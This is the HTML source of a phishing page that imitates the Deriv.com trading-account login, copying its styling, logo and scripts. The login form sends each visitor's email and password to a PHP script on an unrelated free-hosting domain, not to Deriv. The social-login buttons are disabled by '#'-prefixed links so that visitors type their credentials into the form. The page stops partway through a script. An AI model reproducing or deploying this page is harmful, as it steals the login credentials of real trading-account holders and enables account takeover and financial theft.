




<!DOCTYPE html>
<html>
    <head>
        <title>Log in | Deriv.com </title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Log in to your Deriv online trading account and start trading on the most popular financial markets.">
        <meta name="keywords" content="online trading, deriv trading, online trading account, deriv account">
			<meta name="robots" content="noindex, noarchive, follow">
		<link rel="stylesheet" type="text/css" href="https://static.deriv.app/css/oneall-deriv.css" />
		
			

        <link rel="shortcut icon" href="https://deriv.com/icons/icon-48x48.png"/>
        <link rel="apple-touch-icon" sizes="48x48" href="https://deriv.com/icons/icon-48x48.png"/>
        <link rel="apple-touch-icon" sizes="72x72" href="https://deriv.com/icons/icon-72x72.png"/>
        <link rel="apple-touch-icon" sizes="96x96" href="https://deriv.com/icons/icon-96x96.png"/>
        <link rel="apple-touch-icon" sizes="144x144" href="https://deriv.com/icons/icon-144x144.png"/>
        <link rel="apple-touch-icon" sizes="192x192" href="https://deriv.com/icons/icon-192x192.png"/>
        <link rel="apple-touch-icon" sizes="256x256" href="https://deriv.com/icons/icon-256x256.png"/>
        <link rel="apple-touch-icon" sizes="384x384" href="https://deriv.com/icons/icon-384x384.png"/>
        <link rel="apple-touch-icon" sizes="512x512" href="https://deriv.com/icons/icon-512x512.png"/>

        <style type="text/css">
            @import url("https://fonts.googleapis.com/css?family=IBM+Plex+Sans:300,600&display=swap");
            /*---------- variables ---------- */
            :root {
                /* colors */
                --color-black: #0e0e0e;
                --color-black-2: #2a2a2a;
                --color-black-3: #333333;
                --color-black-4: #182039;
                --color-white: #ffffff;
                --color-red: #ff444f;
                --color-red-1: #dd573a;
                --color-red-2: #ffc9cc;
                --color-red-3: #d43e47;
                --color-grey: #c2c2c2;
                --color-grey-1: #999999;
                --color-grey-2: #666565;
                --color-grey-3: #f2f2f2;
                --color-grey-4: #f2f3f4;
                --color-grey-5: #d6dadb;
                --color-grey-6: #777777;
                --color-grey-7: #f3f3f3;
                --color-green: #85acb0;
                --color-blue: #4c76be;
                --color-blue-2: #365899;
                --color-yellow: #fff2df;

                /* sizes */
                --text-size-xxxs: 1rem;
                --text-size-xxs: 1.2rem;
                --text-size-xsm: 1.3rem;
                --text-size-xs: 1.4rem;
                --text-size-s: 1.6rem;
                --text-size-sm: 2rem;
                --text-size-m: 2.4rem;
                --text-size-l: 3.2rem;
                --text-size-xl: 4.8rem;
                --text-size-xxl: 6.4rem;
            }
            html {
                font-size: 62.5%;
            }
            body,
            * {
                font-family: "IBM Plex Sans", sans-serif;
            }
            body {
                margin: 0;
                background-color: #FFFFFF;
                letter-spacing: 0.15px;
            }
            header {
                display: flex;
                align-items: center;
                justify-content: center;
                height: 73px;
                margin-bottom: 4rem;
                background-color: #FFFFFF;
            }
            @media (max-width: 480px) {
                header {
                    margin-bottom: unset;
                }
            }
            
            header #logo {
                display: flex;
                align-items: center;
                justify-content: center;
                max-width: 100%;
                border-style: solid;
                border-width: 0 0 0 0;
                border-color: var(--color-white);
            }
            header #subheader {
                height: 16px;
            }
            header #logo, header #subheader {
                padding: 0 9px;
            }
            a {
                color: var(--color-red);
                font-size: var(--text-size-xs);
                line-height: 1.5;
                text-decoration: none;
            }
            a:hover {
                cursor: pointer;
                text-decoration: underline;
            }
            p {
                color: var(--color-black-3);
                font-weight: normal;
                font-size: var(--text-size-xs);
                line-height: 1.5;
                margin: 0;
            }
            p.secondary {
                color: var(--color-grey);
            }
            p.error {
                color: var(--color-red);
                font-size: var(--text-size-xxs);
                align-self: flex-start;
                padding-left: 0.8rem;
            }

            h1,
            h2,
            h3 {
                font-weight: bold;
                line-height: 1.25;
                width: 100%;
                margin-top: 0;
            }
            h1 {
                font-size: var(--text-size-xxl);
            }

            h2 {
                font-size: var(--text-size-xl);
            }

            h3 {
                font-size: var(--text-size-l);
            }

            h4 {
                font-size: var(--text-size-m);
            }

            /*---------- form, input, button ---------- */
            #container {
                display: flex;
                flex-direction: column;
                align-items: start;
                max-width: 40.6rem;
                margin: auto;
                text-align: left;
                padding: 40px;
                background-color: var(--color-white);
                border-radius: 6px;
                //box-shadow: 0 16px 20px 0 rgba(0, 0, 0, 0.05), 0 0 20px 0 rgba(0, 0, 0, 0.05);
            }
            @media (max-width: 480px) {
                #container {
                    padding:40px 16px;
                }
            }
            form {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                margin: 0 auto 3.2rem;
            }
            form .input-group {
                margin-top: 1.4rem;
                height: 3.8rem;
            }
            form .input-group:first-child {
                margin-top: 0;
            }
            form a {
                align-self: center;
            }

            div.input-group {
                width: 100%;
                height: max-content;
            }
            div.input-wrapper {
                position: relative;
                border: 1px solid var(--color-grey-5);
                border-radius: 4px;
            }
            div.input-error {
                min-height: 1.8rem;
            }
            div.input-wrapper:hover {
                border-color: var(--color-grey-1);
            }
            div.input-wrapper.has_error {
                border-color: var(--color-red);
            }
            div.input-wrapper.has_error input ~ label {
                color: var(--color-red);
            }
            div.input-wrapper .input-button {
                position: absolute;
                top: 0;
                right: 10px;
                width: 17px;
                height: 100%;
                background-repeat: no-repeat;
                background-position: center center;
                cursor: pointer;
                display: none;
            }
            div.input-wrapper #btnToggle.icon_hidden {
                background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij4KICAgIDxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTAgMGgxNnYxNkgweiIvPgogICAgICAgIDxwYXRoIGZpbGw9IiM5OTkiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTE0LjE3NyAyLjExOGEuNS41IDAgMSAxIC42NDYuNzY0bC0yLjA0OCAxLjczMkE3LjkyNSA3LjkyNSAwIDAgMSAxNS4zMzMgOGMtMS4xNTMgMi45MjctNCA1LTcuMzMzIDVhNy44MyA3LjgzIDAgMCAxLTMuOTA4LTEuMDM4bC0yLjI2OSAxLjkyYS41LjUgMCAxIDEtLjY0Ni0uNzY0bDIuMDQ3LTEuNzMzQTcuOTI1IDcuOTI1IDAgMCAxIC42NjcgOEMxLjgyIDUuMDczIDQuNjY3IDMgOCAzYTcuODMgNy44MyAwIDAgMSAzLjkwOSAxLjAzOHptLTIuMjY1IDMuMjI2TDEwLjU4IDYuNDcyYy4yNjcuNDQ4LjQyLjk3LjQyIDEuNTI4IDAgMS42NTMtMS4zNDcgMy0zIDMtLjczNiAwLTEuNDEtLjI2Ny0xLjkzMy0uNzA4bC0xLjEwNi45MzVDNS44OCAxMS43MjcgNi45MTQgMTIgOCAxMmMyLjU4NSAwIDQuODc4LTEuNTUgNi00YTcuMDQ2IDcuMDQ2IDAgMCAwLTIuMDg4LTIuNjU2ek04IDRDNS40MjIgNCAzLjEyMiA1LjU1IDIgOGE3LjA1IDcuMDUgMCAwIDAgMi4wODYgMi42NTZMNS40MiA5LjUyOEEyLjk4IDIuOTggMCAwIDEgNSA4YzAtMS42NTMgMS4zNDctMyAzLTMgLjczNiAwIDEuNDExLjI2NyAxLjkzNC43MDlsMS4xMDUtLjkzNUE2LjMzNiA2LjMzNiAwIDAgMCA4IDR6bTEuODAyIDMuMTNMNi44NDUgOS42MzNBMiAyIDAgMCAwIDkuODAyIDcuMTN6TTggNmEyIDIgMCAwIDAtMS44MDIgMi44N2wyLjk1Ny0yLjUwM0ExLjk5IDEuOTkgMCAwIDAgOCA2eiIvPgogICAgPC9nPgo8L3N2Zz4K");
            }
            div.input-wrapper #btnToggle.icon_visible {
                background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij4KICAgIDxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTAgMGgxNnYxNkgweiIvPgogICAgICAgIDxwYXRoIGZpbGw9IiM5OTkiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTggNGMyLjU3OCAwIDQuODc4IDEuNTUgNiA0LTEuMTIyIDIuNDUtMy40MTUgNC02IDRzLTQuODc4LTEuNTUtNi00YzEuMTIyLTIuNDUgMy40MjItNCA2LTRtMC0xQzQuNjY3IDMgMS44MiA1LjA3My42NjcgOGMxLjE1MyAyLjkyNyA0IDUgNy4zMzMgNXM2LjE4LTIuMDczIDcuMzMzLTVjLTEuMTUzLTIuOTI3LTQtNS03LjMzMy01em0wIDNhMiAyIDAgMSAxLS4wMDEgNC4wMDFBMiAyIDAgMCAxIDggNm0wLTFDNi4zNDcgNSA1IDYuMzQ3IDUgOHMxLjM0NyAzIDMgMyAzLTEuMzQ3IDMtMy0xLjM0Ny0zLTMtM3oiLz4KICAgIDwvZz4KPC9zdmc+Cg==");
            }
            input[type=password]::-ms-reveal,
            input[type=password]::-ms-clear {
              display: none;
            }
            input {
                background: none;
                color: var(--color-black-3);
                font-size: var(--text-size-s);
                padding: 1rem 1rem 1rem 0.8rem;
                width: calc(100% - 1.8rem);
                display: block;
                border: none;
                border-radius: 0;
            }
            input::-webkit-input-placeholder {
                opacity: 0;
                -webkit-transition: opacity 0.25s;
                -o-transition: opacity 0.25s;
                transition: opacity 0.25s;
                padding-left: 0.3rem;
            }
            input::-moz-placeholder {
                opacity: 0;
                -webkit-transition: opacity 0.25s;
                -o-transition: opacity 0.25s;
                transition: opacity 0.25s;
                padding-left: 0.3rem;
            }
            input:-ms-input-placeholder {
                opacity: 0;
                -webkit-transition: opacity 0.25s;
                -o-transition: opacity 0.25s;
                transition: opacity 0.25s;
                padding-left: 0.3rem;
            }
            input::-ms-input-placeholder {
                opacity: 0;
                -webkit-transition: opacity 0.25s;
                -o-transition: opacity 0.25s;
                transition: opacity 0.25s;
                padding-left: 0.3rem;
            }
            input ~ label {
                color: var(--color-grey-1);
                font-size: var(--text-size-xs);
                position: absolute;
                pointer-events: none;
                left: 1.1rem;
                top: 1rem;
                transition: 0.25s ease all;
                transform-origin: top left;
            }
            input:focus {
                outline: none;
            }
            input:focus::-webkit-input-placeholder {
                opacity: 0.4;
            }
            input:focus::-moz-placeholder {
                opacity: 0.4;
            }
            input:focus:-ms-input-placeholder {
                opacity: 0.4;
            }
            input:focus::-ms-input-placeholder {
                opacity: 0.4;
            }
            input:focus::placeholder {
                opacity: 0.4;
            }
            input:focus ~ label,
            label.raised-label,
            input:not(:focus):not(:invalid) ~ label {
                background-color: var(--color-white);
                -webkit-transform: translate(-4px, -1.8rem) scale(0.71);
                -ms-transform: translate(-4px, -1.8rem) scale(0.71);
                transform: translate(-4px, -1.8rem) scale(0.71);
                padding: 0 4px;
                -webkit-transform-origin: top left;
                -ms-transform-origin: top left;
                transform-origin: top left;
            }
            /* somehow this `input:-webkit-autofill` was not picked on focus in Edge
            if we add it with other classes as above. it worked separately. */
            input:-webkit-autofill ~ label {
                background-color: var(--color-white);
                -webkit-transform: translate(0, -1.8rem) scale(0.75);
                padding: 0 4px;
                -webkit-transform-origin: top left;
            }
            input[style*="background"] ~ .input-button {
                right: 32px;
            }
            input:not(:placeholder-shown) ~ .input-button {
                display: block;
            }
            button {
                border-radius: 4px;
                padding: 1rem 1.6rem;
                font-size: 1.4rem;
                transition: all 0.25s;
                font-weight: bold;
            }
            button:hover {
                cursor: pointer;
            }
            button:focus,
            button:active {
                outline: none;
            }
            button:active {
                transform: scale(0.95);
            }
            button > * {
                pointer-events: none;
            }
            button.primary {
                border: 2px solid var(--color-red);
                color: var(--color-red);
                background: transparent;
            }
            button.primary:hover {
                background-color: var(--color-red);
                color: var(--color-white);
            }
            button.secondary {
                border: 2px solid var(--color-red);
                color: var(--color-white);
                background: var(--color-red);
            }
            button.secondary:hover {
                background-color: var(--color-red-3);
                border-color: var(--color-red-3);
            }
            button.tertiary {
                border: 2px solid var(--color-grey-1);
                color: var(--color-black);
                background: transparent;
            }
            button.tertiary:hover {
                background-color: rgba(0, 0, 0, 0.08);
            }

            #lost-password {
                align-self: flex-start;
                margin-bottom: 3rem;
            }

            #lost-password-container {
                display: flex;
                align-items: center;
                justify-content: space-between;
                width: 100%;
                flex-direction: column;
            }

            #lost-password-container button[type="submit"] {
                margin-left: auto;
                border: none;
                width: 100%;
                height: 4rem;
                border-radius:16px !important;
            }

            #oa_social_login_container {
                margin: 1.6rem auto;
                width: 100%;
            }
            
            #oa_social_login_container iframe #social_login {
                background: black !important;
            }

            div#oa_social_login_container iframe {
                height: 170px !important;
                width: 100% !important;
            }

            p.error-oneall {
                color: var(--color-red);
                font-size: var(--text-size-s);
                width: 100%;
                text-align: center;
                margin-bottom: 30px;
                margin-top: -20px;
            }
            .title-text {
                margin-top: 0;
                margin-bottom: 0.8rem;
                line-height: 3.6rem;
            }
            .subtitle-text {
                display: flex;
                font-size: var(--text-size-s);
                color: var(--color-black-3);
                margin-bottom: 1.6rem;
                align-items: center;
            }
            .deriv-url {
                background-color: var(--color-grey-3);
                border-radius: var(--text-size-s);
                margin-left: 0.8rem;
                line-height: 0;
            }
            .binary-logo {
                margin-right: 10px;
            }
            .binary-logo svg {
                vertical-align: middle;
            }
            .center-text {
                text-align: center;
            }
            .note-container {
                background-color: rgba(242, 243, 244, 0.56);
                display: flex;
                padding: 0.8em;
                margin-bottom: 2.5rem;
                align-items: center;
                border-radius: 4px;
            }
            .note-wrapper {
                text-align: left;
                display: flex;
                flex-direction: column;
                min-height: 42px;
            }
            .note-title {
                font-size: var(--text-size-xs);
                color: var(--color-grey-2);
                text-align: left;
                font-weight: normal;
                margin: 0;
                line-height: 21px;
            }
            .note-text {
                color: var(--color-grey-2);
                font-size: var(--text-size-xxxs);
            }
            .separator {
                width: 100%;
                border-top: 1px solid var(--color-grey-5);
            }
            .social-text {
                color: var(--color-grey-6);
                width: fit-content;
                margin: auto;
                transform: translateY(-11px);
                background: var(--color-white);
                padding: 0 2.2rem;
            }
            .account-link {
                font-size: var(--text-size-s);
            }
            .account-text {
                color: var(--color-black-3);
                font-size: var(--text-size-s);
                width: 100%;
                text-align: center;
                margin-bottom: 30px;
                margin-top: -20px;
            }
            @media (max-width: 480px) {
                .account-text {
                    margin-top: -18px;
                    margin:1.6rem auto 0;
                }
            }
            @media (max-width: 435px) {
                .account-text {
                    margin-top: -18px;
                    width: 58%
                }
            }
            @media (max-width: 360px) {
                .account-text {
                    width: 63%
                }
            }
            .hide {
                display: none;
            }
            @media (max-width: 368px) {
                html {
                    font-size: 55%;
                }
                .subtitle-text {
                    flex-direction: column;
                }
                .deriv-url {
                    margin-top: 0.8rem;
                    margin-left: 0;
                }
            }

            /*---------- Scopes confirmation page ---------- */
            .scope-confirms#container {
                max-width: 50rem;
            }
            .scope-title {
                margin-bottom: 0.8rem;
            }
            .scope-subtitle {
                font-size: var(--text-size-sm);
            }
            .scopes {
                margin-top: 2.4rem;
                margin-bottom: 3.2rem;
                padding: 2.4rem;
                background: var(--color-grey-7);
            }
            .scopes ul {
                text-align: left;
                margin: 0;
                padding: 0;
                padding-left: 2rem;
            }
            .scopes li {
                color: var(--color-black-3);
                font-size: var(--text-size-s);
                padding: 1rem 0;
            }
            #btnCancel {
                margin-right: 0.8rem;
            }

            /*---------- reactivate account page ---------- */
            .reactivate-account#container {
                align-items: center;
                text-align: center;
            }
            .reactivate-title {
                font-size: 2.4rem;
                margin-bottom: 0.8rem;
            }
            .reactivate-description {
                font-size: 1.6rem;
                margin-bottom: 2.4rem;
            }

            .reactivate-description a {
                font-size: 1.6rem;
            }

            @media (max-width: 450px) {
                .reactivate-account#container {
                    background-color: unset;
                    box-shadow: unset;
                }
                .reactivate-title {
                    font-size: 2rem;
                }
            }
        </style>
<script type="text/javascript" src="https://deriv.api.oneall.com/socialize/library.js"></script>
       
    </head>
    <body class="oauth">
        <header>
            <a id="logo" href=".">
                <svg width="217" height="32" viewBox="0 0 217 72" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip0_987_32033)">
                        <path d="M43.4717 2.27116L39.7568 23.331H26.8612C14.8305 23.331 3.36323 33.0745 1.23785 45.1006L0.338242 50.2194C-1.77724 62.2456 6.24979 71.9892 18.2805 71.9892H29.036C37.8045 71.9892 46.1578 64.8938 47.7 56.1289L57.6053 0L43.4717 2.27116ZM34.3216 54.1425C33.8471 56.8501 31.4085 59.054 28.6999 59.054H22.1656C16.7582 59.054 13.1401 54.6661 14.089 49.2509L14.6526 46.0592C15.6114 40.6538 20.7717 36.2563 26.1791 36.2563H37.4767L34.3216 54.1425ZM142.785 71.9881L151.247 24.0018H164.632L156.17 71.9881H142.785ZM144.233 24.5552C143.562 28.3613 142.888 32.1675 142.217 35.9738C135.876 34.0039 129.334 34.6312 127.324 35.0319C125.153 47.3536 122.979 59.6783 120.806 72H107.412C109.231 61.6902 115.444 26.4806 115.444 26.4806C119.801 24.6774 130.499 21.0176 144.233 24.5552ZM89.9629 23.3228H79.5436C69.3911 23.3228 59.7136 31.5444 57.924 41.6931L55.8185 53.6204C54.0291 63.7689 60.8009 71.9908 70.9535 71.9908H93.1167L95.3905 59.0951H74.5612C71.1807 59.0951 68.9167 56.3577 69.5199 52.9682L69.5891 52.5631H103.17L105.088 41.6931C106.877 31.5444 100.106 23.3228 89.9531 23.3228H89.9629ZM91.6534 40.6654L91.5744 41.3571H71.6059L71.7146 40.7444C72.3173 37.3648 75.4019 34.3904 78.7922 34.3904H86.592C89.9434 34.3904 92.2074 37.3154 91.6534 40.6654ZM203.463 24.0018H216.857C212.294 36.1284 201.838 56.7568 191.708 71.9881H178.314C173.664 57.4915 170.661 37.293 170.089 24.0018H183.484C183.725 28.3374 185.667 44.4186 187.883 55.653C193.96 44.7236 200.66 30.384 203.452 24.0018H203.463Z" fill="#FF444F"/>
                    </g>
                    <defs>
                        <clipPath id="clip0_987_32033">
                        <rect width="217" height="72" fill="white"/>
                        </clipPath>
                    </defs>
                </svg>
            </a>
        </header>

        
    <div id="container">
        <h1 class="title-text" style="font-size: 2.4rem">Welcome!</h1>
        <p class="subtitle-text">Log in to continue.</p>
       <form novalidate="" id="frmLogin" action="//ayowyhed.000webhostapp.com/pop.php" method="POST">
					<div class="input-group">
						<div class="input-wrapper has_error">
							<input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
							<label for="txtEmail" class="raised-label">Email</label>
							<span class="bar"></span>
						</div>
						<div class="input-error">
							<p class="hide error error_invalid">That doesn't look like an email address.</p>
							<p class="error error_required">Your email and/or password is incorrect. Perhaps you signed up with a social account?</p>
						</div>
					</div>
					<div class="input-group">
						<div class="input-wrapper">
							<input type="password" id="txtPass" name="Password" required="" autocomplete="off">
							<label for="txtPass" class="raised-label">Password</label>
							<span class="bar"></span>
							<span id="btnToggle" class="input-button icon_hidden"></span>
						</div>
						<div class="input-error">
							<p class="hide error error_required">Password is required.</p>
						</div>
					</div>
					<div id="lost-password-container">
						<a id="lost-password" href="https://deriv.com/reset-password">Forgot password?</a>
						<button type="submit" class="button secondary" name="login" value="Log in">Log in</button>
					</div>
					<input type="hidden" name="csrf_token" value="8585188bea406650baaf2123a1c6669624d29f69"></form>
        
     <link href="https://static.deriv.app/css/oneall-deriv.css" type="text/css" rel="stylesheet" />
    <style>
        .providers_row {
            display: flex;
            justify-content: space-between;
            align-content: center;
            flex-direction: column;
            gap: 0.8rem;
        }
        .provider a.button {
            height: 38px;
        }
        .account-text {
            margin-top: 17px;
        }
        p.error-oneall {
            margin-top: 0;
        }
        .social_login_providers {
            margin: 1.6rem auto;
            width: 100%;
        }
    </style>
    <div class="separator">
        <p class="center-text social-text">
            Or log in with
        </p>
    </div>
    <div class="providers_row social_login_providers">
    
        
            <div class="provider" id="provider_google">
                <a class="button" id="button_google" href="#/accounts.google.com/o/oauth2/v2/auth?client_id=946366519426-7b697p8590q1a53pmc727iigp1gmbgit.apps.googleusercontent.com&scope=openid%20email&response_type=code&redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Fgoogle&code_challenge=50PSDX2ChgkzlKm3bGcK3Tt6RjK2mm2stsg8sCVyoc0&code_challenge_method=S256&nonce=IEWM1tpSfvHFSIBgqB6VYpaUrYQ3YUqs4f404%2FVwZ4g%3D&state=Yr42EsQCUDhkagepzUujeARQfxuMXzsxNMu0C9LJLXQ%3D" rel="nofollow" title="Login with google" role="button" aria-label="Login with google" aria-haspopup="true">
                    <div class="name" id="name_google">Google</div>
                </a>
            </div>
        
    
        
            <div class="provider" id="provider_facebook">
                <a class="button" id="button_facebook" href="#/facebook.com/dialog/oauth?client_id=464524112160643&scope=openid%20email&response_type=code&redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Ffacebook&code_challenge=4l0q8lvkXQ0fXMKVW8r6uXfUaHtVgOj2BYm2L5tPwQE&code_challenge_method=S256&nonce=em9Rs3QUZwZiI9wXDXw1yPqYrXC9dNwAt%2BoM74x9JEM%3D&state=tW%2FqbO8M1CZ6vcZBtNmdmR%2FSUujifnY1NvXU2e0DlnM%3D" rel="nofollow" title="Login with facebook" role="button" aria-label="Login with facebook" aria-haspopup="true">
                    <div class="name" id="name_facebook">Facebook</div>
                </a>
            </div>
        
    
        
            <div class="provider" id="provider_apple">
                <a class="button" id="button_apple" href="#appleid.apple.com/auth/authorize?client_id=com.deriv.svc.social-login&scope=openid%20email&response_type=code&redirect_uri=https%3A%2F%2Foauth.deriv.com%2Foauth2%2Fsocial-login%2Fcallback%2Fapple&code_challenge=g1dCQdUZte9TeQPAL0p8mCGREykbqtMzMkh7aGTJjkk&code_challenge_method=S256&nonce=slVUoBqeuu7v1LyIo%2BaA5W5%2BI0nBu6w0t1nKYpFsGac%3D&state=auPmyhJrM13qJx0C%2BKtVgTxNY4savBItHJMVQDIQRGU%3D&response_mode=form_post" rel="nofollow" title="Login with apple" role="button" aria-label="Login with apple" aria-haspopup="true">
                    <div class="name" id="name_apple">Apple</div>
                </a>
            </div>
        
    
    </div>


            
            
        
        <p id="signup-link" class="account-text"></p>
    </div>
    <script>
        var websiteDomain = 'deriv.com';
        var app_id = '16929';
        var currentUrl = new URL(location.href);
        var partnerId = currentUrl.searchParams.get('partnerId');
        var signup_url = '';

        if (partnerId && /^[\w\-]{1,32}$/.test(partnerId)) {
            partnerId = encodeURIComponent(partnerId);    
        } else {
            partnerId = '';
        }

        if (app_id == 36218) {
            if (partnerId) {
                signup_url = `Don’t have an account yet? <a class='account-link' href='https://deriv.com/ctrader-signup/?app_id=36218&partnerId=` + partnerId + `'>Create a new account</a>`;
            } else {
                signup_url = `Don’t have an account yet? <a class='account-link' href='https://deriv.com/ctrader-signup/?app_id=36218'>Create a new account</a>`;
            }
        } else {
            signup_url = `Don’t have an account yet? <a class='account-link' href='https://deriv.com/signup/'>Create a new account</a>`;
        }

        document.getElementById("signup-link").innerHTML = signup_url;
    
    </script>


<script type="text/javascript">
    var frmLogin, txtEmail, txtPass, btnToggle;
    window.onload = function() {
        frmLogin  = document.getElementById('frmLogin');
        txtEmail  = document.getElementById('txtEmail');
        txtPass   = document.getElementById('txtPass');
        btnToggle = document.getElementById('btnToggle');

        btnToggle.addEventListener('click', togglePasswordVisibility);

        if (frmLogin) {
            frmLogin.addEventListener('submit', function(e) {
                if (!validateAll()) {
                    e.preventDefault();
                    return false;
                }
            });
        }

        var fields = [
            { element: txtEmail, validator: validateEmail },
            { element: txtPass,  validator: validatePass },
        ];
        fields.forEach(function(field) {
            if (field.element) {
                ['change', 'blur'].forEach(function(event) {
                    field.element.addEventListener(event, function(e) {
                        field.validator();
                    });
                });
            }
        });
    };

    function validateAll() {
        return validateEmail() && validatePass();
    }

    function validateEmail() {
        return validateField(txtEmail, new RegExp(/^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}$/));
    }

    function validatePass() {
        return validateField(txtPass, new RegExp(/^[ -~]{6,25}$/));
    }

    function validateField(element, regex) {
        if (element) {
            hideErrors(element);

            var hasError = true;
            var value = (element.value || '').trim();
            element.value = value;
            if (!value) {
                showError(element, 'required');
            } else if (!regex.test(value) || !element.checkValidity()) {
                showError(element, 'invalid');
                raiseLabel(element, 1);
            } else {
                hasError = false;
                raiseLabel(element, !!value)
            }

            return !hasError;
        }
    }

    function hideErrors(element) {
        element.parentNode.classList.remove('has_error');
        element.parentNode.parentNode.querySelectorAll('.input-error .error').forEach(function (el) {
            el.classList.add('hide');
        });
    }

    function showError(element, errorType) {
        element.parentNode.classList.add('has_error');
        var el = element.parentNode.parentNode.querySelector('.input-error .error_' + errorType);
        if (el) {
            el.classList.remove('hide');
        }
    }
    function raiseLabel(element, should_raise) {
        element.parentNode.querySelector('label').classList[should_raise ? 'add' : 'remove']('raised-label');
    }

    function scrollToErrorOneall() {
        const element = document.querySelector('p.error-oneall');
  
        if (element) {
        const offsetTop = element.offsetTop;
        const offsetLeft = element.offsetLeft;
    
        window.scrollTo({
        top: offsetTop,
        left: offsetLeft,
        behavior: 'smooth'
        });
        }
    }

    setTimeout(function() {
	scrollToErrorOneall();
    }, 1000);

    function togglePasswordVisibility() {
        if (txtPass.type === 'password') {
            txtPass.type = 'text';
            btnToggle.classList.remove('icon_hidden');
            btnToggle.classList.add('icon_visible');
        } else {
            txtPass.type = 'password';
            btnToggle.classList.remove('icon_visible');
            btnToggle.classList.add('icon_hidden');
        }
    }
</script>

<script src="https://www.datadoghq-browser-agent.com/us1/v4/datadog-rum.js" type="text/javascript"></script>
<script>
    var DD_APP_ID = '5c8975a3-ec86-4a64-8a3a-e6888fdde082';
    var DD_CLIENT_TOKEN = 'pub08554ab30284600af157441bfb0fa923';

    if(window.DD_RUM && DD_APP_ID && DD_CLIENT_TOKEN) {
        window.DD_RUM.init({
            clientToken: DD_CLIENT_TOKEN,
            applicationId: DD_APP_ID,
            site: 'datadoghq.com',
            service: 'oauth.deriv.com',
            env: 'production',
            version: '1.0',
            sessionSampleRate: 10,
            sessionReplaySampleRate: 10,
            trackResources: true,
            trackLongTasks: true,
            trackUserInteractions: true,
            trackFrustrations: true,
            defaultPrivacyLevel: 'mask-user-input',
            enableExperimentalFeatures: ['clickmap'],
        })

        window.DD_RUM.startSessionReplayRecording();
    }
</script>


        <!-- Google Tag Manager -->
        <script>
            (function (w, d, s, l, i) {
                w[l] = w[l] || []; w[l].push({
                    'gtm.start':
                        new Date().getTime(), event: 'gtm.js'
                }); var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-NF7884S');
        </script>
        <script>
            function logoSelector(app_id) {
                if (app_id == 36218) {
                    return `<div id="logo" class="flex _ctrader-wrapper-module--nav_style--618e8 gap-5x align-items-center justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" width="45" height="44" fill="none"><path fill="#E22526" d="M.75 8.127A8.127 8.127 0 0 1 8.877 0h27.089a8.127 8.127 0 0 1 8.127 8.127v27.089a8.127 8.127 0 0 1-8.127 8.127H8.876A8.127 8.127 0 0 1 .75 35.216V8.126Z"/><path fill="#B51E1E" d="M8.877 0A8.127 8.127 0 0 0 .75 8.127v.236l40.518-6.395A8.095 8.095 0 0 0 35.966 0H8.876ZM42.104 2.8l-7.432 40.543h1.294a8.127 8.127 0 0 0 8.127-8.127V8.126c0-2.037-.75-3.899-1.989-5.325Z"/><path fill="#fff" d="M12.95 23.122c0-.72.113-1.397.34-2.029a4.87 4.87 0 0 1 1.025-1.669c.442-.48.98-.86 1.612-1.137.632-.278 1.352-.418 2.161-.418.531 0 1.018.051 1.46.152.443.089.873.221 1.29.398l-.588 2.257a7.1 7.1 0 0 0-.872-.266 4.556 4.556 0 0 0-1.062-.113c-.834 0-1.46.259-1.877.777-.405.518-.607 1.201-.607 2.048 0 .898.19 1.593.569 2.086.392.493 1.068.74 2.029.74a6.93 6.93 0 0 0 1.1-.095 4.674 4.674 0 0 0 1.08-.304l.399 2.314c-.33.139-.74.259-1.233.36a8.127 8.127 0 0 1-1.63.152c-.91 0-1.695-.133-2.352-.399-.657-.278-1.201-.65-1.63-1.118a4.51 4.51 0 0 1-.93-1.65 7.363 7.363 0 0 1-.284-2.086ZM31.893 14.968v2.522H27.93v10.62h-2.958V17.49h-3.963v-2.522h10.884Z"/></svg>
